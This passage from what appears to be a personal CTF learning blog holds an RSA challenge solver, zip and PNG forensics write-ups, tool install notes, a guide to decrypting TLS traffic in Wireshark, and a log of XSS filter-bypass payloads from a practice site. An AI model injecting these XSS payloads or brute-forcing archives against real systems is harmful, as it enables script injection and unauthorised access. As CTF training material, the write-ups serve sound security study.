<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">73553176031506251642448229714220151174734540964434813056145000616720019024269982417494553771890010861489245572362590935764438928110836109730139595790550323300572059713433794357690270439325805603980903813396260703</span></span><br><span class="line">c = <span class="number">19209686331218755173713714974036153099675780768506975193406617712945126866438211292560144823093347834048813455853960982766572556698881387553177980003129346158494272297017876567974550982519632403844694686184532804</span></span><br><span class="line">e = <span class="number">31337</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Original_RSA</span>(<span class="params">p,q,e,c,n</span>):</span><br><span class="line">    N = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    d = <span class="built_in">int</span>(invert(e, N))</span><br><span class="line">    m = powmod(c, d, n)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line">r = Symbol(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">p = <span class="keyword">lambda</span> r: r ** <span class="number">6</span> + <span class="number">8</span> * r ** <span class="number">4</span> - <span class="number">41</span> * r ** <span class="number">3</span> + <span class="number">14</span> * r ** <span class="number">2</span> - <span class="number">116</span> * r + <span class="number">31387</span></span><br><span class="line">q = <span class="keyword">lambda</span> r: r ** <span class="number">5</span> - <span class="number">9</span> * r ** <span class="number">4</span> + <span class="number">17</span> * r ** <span class="number">3</span> - <span class="number">311</span> * r ** <span class="number">2</span> - <span class="number">16</span> * r + <span class="number">14029</span></span><br><span class="line">n0 = p(r) * q(r)</span><br><span class="line">f = n - n0</span><br><span class="line"><span class="comment"># print(f)</span></span><br><span class="line">sol = solve([f], [r])</span><br><span class="line">x = sol[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">p = mpz(p(x))</span><br><span class="line">q = mpz(q(x))</span><br><span class="line">m = Original_RSA(p, q, e, c, n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode())</span><br><span class="line"><span class="comment"># 642921858775320553662877496454459277194994123046130653667709</span></span><br><span class="line"><span class="comment"># flag&#123;G3t_m0re_fuN_RSA!!!&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># or sage to solve out p, q</span></span><br><span class="line">PR.&lt;k&gt; = PolynomialRing(ZZ) <span class="comment"># define k</span></span><br><span class="line">p = k**<span class="number">6</span> + <span class="number">7</span>*k**<span class="number">4</span> - <span class="number">40</span>*k**<span class="number">3</span> + <span class="number">12</span>*k**<span class="number">2</span> - <span class="number">114</span>*k + <span class="number">31377</span></span><br><span class="line">q = k**<span class="number">5</span> - <span class="number">8</span>*k**<span class="number">4</span> + <span class="number">19</span>*k**<span class="number">3</span> - <span class="number">313</span>*k**<span class="number">2</span> - <span class="number">14</span>*k + <span class="number">14011</span></span><br><span class="line">n0 = p*q</span><br><span class="line"><span class="comment"># k^11 - 8*k^10 + 26*k^9 - 409*k^8 + 451*k^7 + 10850*k^6 + 44939*k^5 - 158301*k^4 + 71237*k^3 - 9651273*k^2 - 2036532*k + 439623147</span></span><br><span class="line">f = n - n0</span><br><span class="line">sol = f.roots() <span class="comment"># solve the root of the equation</span></span><br><span class="line"><span class="comment"># print(sol)</span></span><br><span class="line"><span class="comment"># [(9291098683758154336, 1)]</span></span><br><span class="line">x = sol[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">p = p(x)</span><br><span class="line">q = q(x)</span><br></pre></td></tr></table></figure>
<h1>ezmisc</h1>
<blockquote>
<p>Download: <a href="ezmisc1.zip">ezmisc</a></p>
</blockquote>
<ul>
<li>Archive pseudo-encryption</li>
<li>Repair the file header</li>
<li>Extract the hidden files</li>
<li>Unzip nested packages</li>
<li>Properties area steganation &amp;&amp; Brute force</li>
<li>Blast file height or width</li>
</ul>
<h2 id="Archive-pseudo-encryption">Archive pseudo-encryption</h2>
<blockquote>
<p>Winhex</p>
</blockquote>
<p>Use winhex to find <code>504B0102</code>, and the keypoint <code>09</code> which is the 5th behind the <code>504B0102</code>. Edit it to <code>00</code> and unzip the zip.</p>
<img src="/2022/11/16/22-11-16-YD/1.jpg" class="" title="Edit and unzip">
<p>And get the output <code>1.png</code>.</p>
<h2 id="Repair-the-file-header">Repair the file header</h2>
<blockquote>
<p>Winhex</p>
</blockquote>
<p>Find the <code>1.png</code> cannot open well. Check the file header, we find that the header is <code>000000000D0A1A0A</code> which is different to <code>89504E470D0A1A0A</code>. Thus, use winhex to edit and get the real <code>1.png</code>.</p>
<img src="/2022/11/16/22-11-16-YD/1.png" class="" title="1.png">
<h2 id="Extract-the-hidden-files">Extract the hidden files</h2>
<blockquote>
<p>binwalk</p>
<p>foremost</p>
</blockquote>
<p>Use binwalk to check if there are hidden files in the picture. If yes, and we execute the foremost to get the hidden files.</p>
<p><em>Make the <strong>output</strong> file empty!</em></p>
<h2 id="Unzip-nested-packages">Unzip nested packages</h2>
<blockquote>
<p>ExtractNow</p>
<p>Download: <a href="ExtractNow_V4.8.3.0.zip">ExtractNow</a></p>
</blockquote>
<p>After using the tool <code>ExtractNow</code>, we get the <code>flag.zip</code> and <code>password.zip</code> both of which are encrypted.</p>
<h2 id="Properties-area-steganation-Brute-force">Properties area steganation &amp;&amp; Brute force</h2>
<blockquote>
<p>ARCHPR</p>
</blockquote>
<p>From the <code>password.zip</code> 's properties, we get the hint that <code>8 digits</code>. We brute the zip’s password by ARCHPR.</p>
<p>Unzip the <code>password.zip</code>, we get the <code>password.txt</code>. By this dictionary, we can also brute the <code>flag.zip</code> by ARCHPR and obtain the final picture <code>flag.png</code>.</p>
<h2 id="Blast-file-height-or-width">Blast file height or width</h2>
<blockquote>
<p>stegsolve</p>
<p>python</p>
<p>winhex</p>
</blockquote>
<p>By the <code>stegsolve</code>, we can make a conclusion that the picture’s height or width has been edited from the <code>Calculated CRC</code>.</p>
<img src="/2022/11/16/22-11-16-YD/2.png" class="" title="stegsolve_check">
<p>Use a script for blasting, remember that the script has its rules.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hexstr2bytes</span>(<span class="params">s</span>):</span><br><span class="line">    b = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s), <span class="number">2</span>):</span><br><span class="line">        temp = s[i:i+<span class="number">2</span>]</span><br><span class="line">        b += struct.pack(<span class="string">&#x27;B&#x27;</span>, <span class="built_in">int</span>(temp, <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">str1 = <span class="string">&#x27;49484452&#x27;</span>   <span class="comment"># HEX/IHDR</span></span><br><span class="line">str2 = <span class="string">&#x27;0802000000&#x27;</span> <span class="comment"># Bit depth，ColorType，Compression method，Filter method，Interlace method</span></span><br><span class="line">bytes1 = hexstr2bytes(str1)</span><br><span class="line">bytes2 = hexstr2bytes(str2)</span><br><span class="line">wid, hei = <span class="number">507</span>, <span class="number">507</span>  <span class="comment"># width height</span></span><br><span class="line"></span><br><span class="line">crc32 = <span class="string">&#x27;0xe440b49a&#x27;</span> <span class="comment"># CRC32</span></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(wid, wid+<span class="number">2000</span>):</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(hei, hei+<span class="number">2000</span>):</span><br><span class="line">        width = <span class="built_in">hex</span>(w)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        height = <span class="built_in">hex</span>(h)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        bytes_tmp = hexstr2bytes(width+height)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">eval</span>(<span class="built_in">hex</span>(zlib.crc32(bytes1+bytes_tmp+bytes2))) == <span class="built_in">eval</span>(crc32):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">hex</span>(w), <span class="built_in">hex</span>(h))</span><br><span class="line">            </span><br><span class="line"><span class="comment"># 0x260 0x1fb</span></span><br></pre></td></tr></table></figure>
<p>Edit the width, and we will get the true <code>flag.png</code>.</p>
<img src="/2022/11/16/22-11-16-YD/flag.png" class="" title="true_flag">
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>euler</tag>
        <tag>polynomial</tag>
        <tag>file</tag>
      </tags>
  </entry>
  <entry>
    <title>22-12-19-Basecrack</title>
    <url>/2022/12/19/22-12-19-basecrack/</url>
    <content><![CDATA[<p>The guidance to install the <code>basecrack</code>.</p>
<span id="more"></span><!--toc-->
<h1>INSTALL</h1>
<blockquote>
<p><a href="https://github.com/mufeedvh/basecrack/">https://github.com/mufeedvh/basecrack/</a></p>
</blockquote>
<ul>
<li>git clone <a href="https://github.com/mufeedvh/basecrack.git">https://github.com/mufeedvh/basecrack.git</a></li>
<li>cd basecrack</li>
<li>pip3 install -r requirements.txt</li>
<li>python3 <a href="http://basecrack.py">basecrack.py</a> -h</li>
</ul>
<p><em>python2 may get error</em></p>
<h2 id="Support">Support</h2>
<p>Recently:</p>
<ul>
<li>Base16</li>
<li>Base32</li>
<li>Base36</li>
<li>Base58</li>
<li>Base62</li>
<li>Base64</li>
<li>Base64Url</li>
<li>Base85</li>
<li>Ascii85</li>
<li>Base91</li>
<li>Base92</li>
<li>Base100</li>
</ul>
<h1>USAGE</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">usage: basecrack.py [-h] [-b BASE] [-f FILE] [-m] [-i IMAGE] [-c] [-e] [-o OUTPUT]</span><br><span class="line"></span><br><span class="line">options:</span><br><span class="line">  -h, --<span class="built_in">help</span>            show this <span class="built_in">help</span> message <span class="keyword">and</span> exit</span><br><span class="line">  -b BASE, --base BASE  Decode a single encoded base <span class="keyword">from</span> argument.</span><br><span class="line">  -f FILE, --file FILE  Decode multiple encoded bases <span class="keyword">from</span> a file.</span><br><span class="line">  -m, --magic           Decode multi-encoded bases <span class="keyword">in</span> one shot.</span><br><span class="line">  -i IMAGE, --image IMAGE</span><br><span class="line">                        Decode base encodings <span class="keyword">from</span> image <span class="keyword">with</span> OCR detection <span class="keyword">or</span> EXIF data.</span><br><span class="line">  -c, --ocr             OCR detection mode.</span><br><span class="line">  -e, --exif            EXIF data detection mode. (default)</span><br><span class="line">  -o OUTPUT, --output OUTPUT</span><br><span class="line">                        Generate a wordlist/output <span class="keyword">with</span> the decoded bases, enter filename</span><br><span class="line">                        <span class="keyword">as</span> the value.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1>EXAMPLE</h1>
<p><a href="base.txt">base</a></p>
<blockquote>
<p>The <code>base.txt</code> is a muti-base, which use base32-&gt;base64-&gt;base64-&gt;base32-&gt;base92-&gt;base100.</p>
</blockquote>
<p>The <code>basecrack</code> now supports the base100. And we can  use the command to solve the problem.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 basecrack.py -f <span class="string">&quot;xxx/base.txt&quot;</span> -m</span><br><span class="line"><span class="comment"># if is just a ciphertext</span></span><br><span class="line"><span class="comment"># python3 basecrack.py -b &quot;ciphertext&quot;</span></span><br></pre></td></tr></table></figure>
<p>The main output:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[-] Iteration: <span class="number">6</span>                                                                             </span><br><span class="line">[-] Heuristic Found Encoding To Be: Base32                                                   </span><br><span class="line">[-] Decoding <span class="keyword">as</span> Base32: This_is_So_S1mple                                                    </span><br><span class="line">&#123;&#123;&lt;&lt;======================================================================&gt;&gt;&#125;&#125;               </span><br><span class="line">[-] Total Iterations: <span class="number">6</span>                                                                      </span><br><span class="line">[-] Encoding Pattern: Base100 -&gt; Base92 -&gt; Base32 -&gt; Base64 -&gt; Base64 -&gt; Base32              </span><br><span class="line">[-] Magic Decode Finished With Result: This_is_So_S1mple                                     </span><br><span class="line">[-] Finished <span class="keyword">in</span> <span class="number">0.0019</span> seconds                         </span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Configuration</category>
      </categories>
      <tags>
        <tag>basecrack</tag>
      </tags>
  </entry>
  <entry>
    <title>22-12-14-Docker-Record</title>
    <url>/2022/12/14/22-12-14-docker-record/</url>
    <content><![CDATA[<p>I want to learn the docker to compile my environment. But this week   I have no time to make full studying.</p>
<p>Thus, I make a record which made by <code>Dalao-Zimablue</code>  in this post.</p>
<span id="more"></span><!--toc-->
<p><a href="https://www.zimablue.life/2022/02/10/Docker%E5%AD%A6%E4%B9%A0/#more">https://www.zimablue.life/2022/02/10/Docker学习/#more</a></p>
]]></content>
      <categories>
        <category>Configuration</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>22-12-20-Encrypto-Wireshark</title>
    <url>/2022/12/20/22-12-20-Encrypto-Wireshark/</url>
    <content><![CDATA[<p>Some traffic packets may be encrypted. When I import the private key in one case, I can’t get the decrypted packets like http.</p>
<p>FinalIy, I search for this problem and get the solution.</p>
<p>This post aims to make a conclusion about the <code>encrypted-traffic-packets(tls/ssl)</code>.</p>
<span id="more"></span><!--toc-->
<h1>REFERENCE</h1>
<blockquote>
<p><a href="https://www.cnblogs.com/jasy/p/16157388.html">https://www.cnblogs.com/jasy/p/16157388.html</a></p>
<p><a href="https://www.joji.me/zh-cn/blog/walkthrough-decrypt-ssl-tls-traffic-https-and-http2-in-wireshark/#md-sslkeylogfile">如何通过Wireshark查看HTTPS、HTTP/2网络包（解码TLS、SSL） (joji.me)</a></p>
</blockquote>
<p>Really thank for the article!</p>
<p><em>The second is to edit the configuration of computer, which can be caught in the direct way by using webshell.</em></p>
<h1>DECRYPT TLS/SSL</h1>
<p>There are three methods to decrypt the encrypted-ssl/tls packets.</p>
<ul>
<li>Use the <code>server's cert</code> or the <code>private-key</code> to decrypt.</li>
<li>Use the <code>ssl-key-log-file</code> to decrypt.</li>
<li>Disable the config setting to decrypt packets which use the <code>Diffie-Hellman-Exchange</code>.</li>
</ul>
<h2 id="Server’s-cert-Private-key">Server’s cert/Private-key</h2>
<h3 id="preparation">preparation</h3>
<ul>
<li>TLS/SSL packets</li>
<li>cert or private-key</li>
<li>wireshark</li>
</ul>
<h3 id="notice">notice</h3>
<p>The TLS/SSL packets should not relate to the <code>Diffie-Hellman-Exchange</code> and just a common encrypted packets.</p>
<h4 id="CERT-PRIVATEKEY">CERT/PRIVATEKEY</h4>
<p>The cert or private-key should not be encrypted. And usually, the private-key is the standard of <code>PKCS#8</code>.</p>
<p>If you have a binary DER, it cannot be used in wireshark, and we ought to make a convert.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">openssl pkcs8 -nocrypt -<span class="keyword">in</span> der.key -informat DER -out pem.key -outformat PEM</span><br></pre></td></tr></table></figure>
<ul>
<li><em>der.key: the name and root of DER</em></li>
<li><em>pem.key: the output file</em></li>
</ul>
<p>And, the private-key ought to be like this:</p>
<img src="/2022/12/20/22-12-20-Encrypto-Wireshark/1.png" class="" title="Private-key">
<p>which shows that the beginning is <code>-----BEGIN RSA PRIVATE KEY-----</code>.</p>
<h4 id="DECRYPT-KEY">DECRYPT KEY</h4>
<blockquote>
<p><a href="https://www.openssl.org/docs/manmaster/man1/rsa.html#EXAMPLES">/docs/manmaster/man1/rsa.html (openssl.org)</a></p>
</blockquote>
<p>If the beginning is <code>-----BEGIN ENCRYPTED PRIVATE KEY-----</code>, we should decrypt the key in a proper way.</p>
<p>a common command is:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">openssl rsa -<span class="keyword">in</span> [source file] -out [outfile]</span><br><span class="line"><span class="comment"># ?Maybe.</span></span><br></pre></td></tr></table></figure>
<h3 id="step">step</h3>
<ul>
<li>OPEN the wireshark and import the private-key or cert.</li>
</ul>
<img src="/2022/12/20/22-12-20-Encrypto-Wireshark/2.png" class="" title="setting">
<ol>
<li><strong>RSA keys list.</strong> Import private key, add the <code>port</code>, <code>ip</code>, <code>protocol</code>, <code>root</code> and the chosen <code>password</code>. <strong>Mainly used.</strong></li>
<li><strong>TLS debug file.</strong> Some debug file.</li>
<li><strong>Master-Secret log.</strong> Key log file.</li>
</ol>
<ul>
<li>If all things right, and we will see the <code>http traffic</code>.</li>
</ul>
<h2 id="Key-log-file">Key log file</h2>
<p>Use the <code>key log file</code>. Usually, this file is in the traffic packets. The key log file is like this.</p>
<img src="/2022/12/20/22-12-20-Encrypto-Wireshark/3.png" class="" title="key log file">
<h2 id="Relate-to-D-H">Relate to D-H</h2>
<p>Sometimes, the encrypted traffic packets cannot be decrypted by using methods above.</p>
<h3 id="how-to-recognize">how to recognize</h3>
<p>When we analyze the traffic packets, we use command like <code>ip.addr == xxx.xxx.xxx.xxx &amp;&amp; tls</code> to find the target packets.</p>
<p>If we see the <code>Client Hello</code>, we should make a notice that it maybe a <code>D-H encrypted traffic packet</code>.</p>
<p>For example:</p>
<img src="/2022/12/20/22-12-20-Encrypto-Wireshark/4.png" class="" title="D-H encrypted">
<p>We can change the browser to catch the traffic again.</p>
<h3 id="set-the-firefox">set the firefox</h3>
<p>The address is <code>about:config</code>, and search for the <code>dhe</code>.</p>
<p>We can change the target according to the traffic packets or make all things   <code>false</code>.</p>
<img src="/2022/12/20/22-12-20-Encrypto-Wireshark/5.png" class="" title="change firefox setting">
<h3 id="recatch-the-traffic-and-analyze">recatch the traffic and analyze</h3>
<img src="/2022/12/20/22-12-20-Encrypto-Wireshark/6.png" class="" title="remove dhe">
<p>After importing the private key, we can see the  decrypted<code>http traffic</code>.</p>
<img src="/2022/12/20/22-12-20-Encrypto-Wireshark/7.png" class="" title="decrypted http traffic">
<h1>CONCLUSION</h1>
<p>The <code>Diffie-Hellman-Exchange</code> is really beyond my imagination.</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>wireshark</tag>
        <tag>diffie_hellman</tag>
      </tags>
  </entry>
  <entry>
    <title>22-12-15-Gaps</title>
    <url>/2022/12/15/22-12-15-gaps/</url>
    <content><![CDATA[<p>The <code>gaps</code> is aim to complete the puzzle.</p>
<span id="more"></span><!--toc-->
<h1>INSTALL</h1>
<ul>
<li>git clone <a href="https://github.com/nemanja-m/gaps.git">https://github.com/nemanja-m/gaps.git</a></li>
<li>cd gaps</li>
<li>pip3 install -r requirements.txt</li>
<li>python3 <a href="http://setup.py">setup.py</a> install</li>
</ul>
<h1>REQUIREMENT</h1>
<p>If <code>pip3 install -r requirements.txt</code> failed, make sure that your environments match the <code>requirements.txt</code>.</p>
<ul>
<li><code>pip3 install numpy</code></li>
<li><code>pip3 install opencv-python</code></li>
<li><code>pip3 install pytest</code></li>
<li><code>pip3 install matplotlib</code></li>
<li><code>pip3 install pillow</code></li>
</ul>
<h1>SETUP</h1>
<p>If run <code>python3 setup.py install</code> failed, maybe you have no permit. So run <code>sudo su</code> and <code>python3 setup.py install</code> again.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Using /usr/lib/python3/dist-packages</span><br><span class="line">Finished processing dependencies <span class="keyword">for</span> gaps==<span class="number">1.0</span></span><br></pre></td></tr></table></figure>
<p>Finally, the install is success.</p>
]]></content>
      <categories>
        <category>Configuration</category>
      </categories>
      <tags>
        <tag>gaps</tag>
      </tags>
  </entry>
  <entry>
    <title>22-12-21-UNknown</title>
    <url>/2022/12/21/22-12-21-UNknown/</url>
    <content><![CDATA[<p>Figure out 2 tasks.</p>
<p>One is for crypto, and the other is for misc.</p>
<p>Both of them are easy.</p>
<span id="more"></span><!--toc-->
<h1>poem</h1>
<blockquote>
<p>reference: [ACTF新生赛2020]base64隐写</p>
</blockquote>
<ul>
<li>base64stego</li>
<li>caeser cipher</li>
</ul>
<h2 id="base64stego">base64stego</h2>
<p><a href="22-12-21-UNknown/poem.txt">poem.txt</a></p>
<p><em>Make sure that the end of each line. This ending is <code>\r\n</code></em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">base64stego</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">b64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;poem.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># print(f.readlines())</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        stegb64 = <span class="built_in">str</span>(line, <span class="string">&#x27;utf-8&#x27;</span>).strip(<span class="string">&#x27;\r\n&#x27;</span>) <span class="comment"># edit</span></span><br><span class="line">        <span class="comment"># print(stegb64)</span></span><br><span class="line">        row64 = <span class="built_in">str</span>(base64.b64encode(base64.b64decode(stegb64)), <span class="string">&#x27;utf-8&#x27;</span>).strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        offset = <span class="built_in">abs</span>(b64chars.index(stegb64.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>]) - b64chars.index(row64.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>]))</span><br><span class="line">        equalnum = stegb64.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> equalnum:</span><br><span class="line">            bin_str += <span class="built_in">bin</span>(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">    output = [<span class="built_in">chr</span>(<span class="built_in">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>)]</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span>.join(output)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h2 id="caeser-cipher">caeser cipher</h2>
<p><em>Just crack!</em></p>
<p>key is <code>13</code>.</p>
<h1>Alex2Bob</h1>
<p><a href="22-12-21-UNknown/Alex2Bob.zip">Alex2Bob</a></p>
<ul>
<li>ARCHPR-mask</li>
<li>PNG-header</li>
<li>PNG-crack width</li>
<li>LSB</li>
</ul>
<h2 id="ARCHPR-mask">ARCHPR-mask</h2>
<p>Known the end of the key is <code>kitty</code>.</p>
<p>This is the <code>mask attack</code>. We don’t know the length of the key, so we try some possibilities.</p>
<p>Until we try to set unknown length is 4, we get the key.</p>
<img src="/2022/12/21/22-12-21-UNknown/1.png" class="" title="setting&amp;output">
<h2 id="PNG-header">PNG-header</h2>
<p>Use the <code>winhex</code> and analyze the png. We find that the file header is wrong, so we should edit the file header <code>88 -&gt; 89</code>.</p>
<img src="/2022/12/21/22-12-21-UNknown/2.png" class="" title="PNG-header">
<p>Still can’t open the picture or see the content.</p>
<h2 id="PNG-crack-width">PNG-crack width</h2>
<p>Crack the true width, and we will get the width is <code>0x260</code>.</p>
<img src="/2022/12/21/22-12-21-UNknown/3.png" class="" title="real width">
<p>Edit the width by winhex or 010Editor, and we will get the real picture.</p>
<img src="/2022/12/21/22-12-21-UNknown/newcat.png" class="" title="newcat">
<h2 id="LSB">LSB</h2>
<p>Two ways to get the information embedded in LSB.</p>
<ul>
<li>stegsolve-original</li>
<li>zsteg</li>
</ul>
<img src="/2022/12/21/22-12-21-UNknown/4.png" class="" title="stegsolve-original">
<img src="/2022/12/21/22-12-21-UNknown/5.png" class="" title="zsteg">
<p>The cipher is <code>ZmxhZ3tsb3ZlX3JhZ2RvbGxfY2F0fQ==</code>, and base64 decode.</p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>base64steg</tag>
        <tag>mask_attack</tag>
        <tag>lsb</tag>
      </tags>
  </entry>
  <entry>
    <title>22-12-30-XSS</title>
    <url>/2022/12/30/22-12-30-XSS/</url>
    <content><![CDATA[<blockquote>
<p><a href="https://xss.haozi.me/#/0x00">alert(1) (haozi.me)</a></p>
</blockquote>
<p>Make a record.</p>
<span id="more"></span><!--toc-->
<h1>0x00</h1>
<p><strong>No filtration.</strong> Just insert code normally.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x00.png" class="" title="0x00">
<h1>0x01</h1>
<ul>
<li><strong>End the label.</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;textarea&gt;</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x01-1.png" class="" title="0x01-1">
<ul>
<li>End the label. <strong>IMG label error.</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/textarea&gt;&lt;img src=&quot;&quot; onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x01-2.png" class="" title="0x01-2">
<h1>0x02</h1>
<p><strong>End the html code.</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt; &lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x02.png" class="" title="0x02">
<h1>0x03</h1>
<p>Filtrate the <code>[()]</code>.  <strong>` to bypass.</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert`1`&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x03.png" class="" title="0x03">
<h1>0x04</h1>
<p><strong>html code bypass.</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; onerror=alert&amp;#x28;&amp;#x31;&amp;#x29;&gt;</span><br></pre></td></tr></table></figure>
<p>Use burpsuite to encode the html.</p>
<img src="/2022/12/30/22-12-30-XSS/0x04-0.png" class="" title="0x04-0">
<img src="/2022/12/30/22-12-30-XSS/0x04-1.png" class="" title="0x04-1">
<h1>0x05</h1>
<p><strong>Comment bypass.</strong></p>
<p>There are two ways to comment for html.</p>
<ul>
<li><code>&lt;!-- comment --&gt;</code></li>
<li><code>&lt;!-- comment --!&gt;</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">comment1 --!&gt; &lt;script&gt;alert(1)&lt;/script&gt; &lt;!-- comment2</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x05.png" class="" title="0x05">
<h1>0x06</h1>
<p>Regex matching, <strong>line break bypass</strong>.</p>
<img src="/2022/12/30/22-12-30-XSS/0x06-0.png" class="" title="0x06-0">
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type = &quot;image&quot; src=&quot;&quot; onerror</span><br><span class="line">=alert(1)</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x06-1.png" class="" title="0x06-1">
<h1>0x07</h1>
<p><strong>HTML single-tag parsing.</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; onerror=alert(1) </span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x07-0.png" class="" title="0x07-0">
<img src="/2022/12/30/22-12-30-XSS/0x07.png" class="" title="0x07">
<h1>0x08</h1>
<ul>
<li><strong>Regex escape</strong>, the label to be closed add a space to escape.</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/style &gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x08-1.png" class="" title="0x08-1">
<ul>
<li><strong>Regex can’t match the space.</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/style</span><br><span class="line">&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;style&gt;</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x08-0.png" class="" title="0x08-0">
<img src="/2022/12/30/22-12-30-XSS/0x08-2.png" class="" title="0x08-2">
<h1>0x09</h1>
<p>Include the website.</p>
<ul>
<li><strong>“” ending bypass with IMG label.</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.segmentfault.com &quot;&gt;&lt;/script&gt;&lt;img src=&quot;&quot; onerror=&quot;alert(1)</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x09-1.png" class="" title="0x09-1">
<ul>
<li><strong>add a character and “” ending bypass.</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://www.segmentfault.com1&quot; onerror=alert(1) </span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x09-2.png" class="" title="0x09-2">
<h1>0x0a</h1>
